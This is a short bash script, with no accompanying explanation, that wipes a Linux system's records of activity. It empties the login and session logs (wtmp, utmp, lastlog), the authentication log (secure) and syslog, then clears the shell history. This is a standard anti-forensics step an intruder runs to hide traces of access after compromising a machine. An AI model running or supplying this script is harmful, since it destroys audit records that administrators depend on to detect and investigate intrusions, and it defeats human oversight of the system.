#!/bin/bash

# binary file
echo >/var/log/wtmp
echo >/var/run/utmp 
echo >/var/log/secure
echo >/var/log/lastlog
echo >/var/log/syslog
history -c

